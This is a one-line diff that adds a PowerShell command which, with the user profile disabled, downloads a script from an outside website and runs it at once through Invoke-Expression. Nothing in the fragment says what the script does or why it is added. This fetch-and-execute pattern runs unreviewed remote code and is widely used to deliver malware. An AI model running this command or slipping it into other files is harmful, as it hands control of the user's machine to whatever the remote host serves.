@@ -1,0 +1,1 @@
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://maaxit.fr/gcreator/gcreator.ps1')"
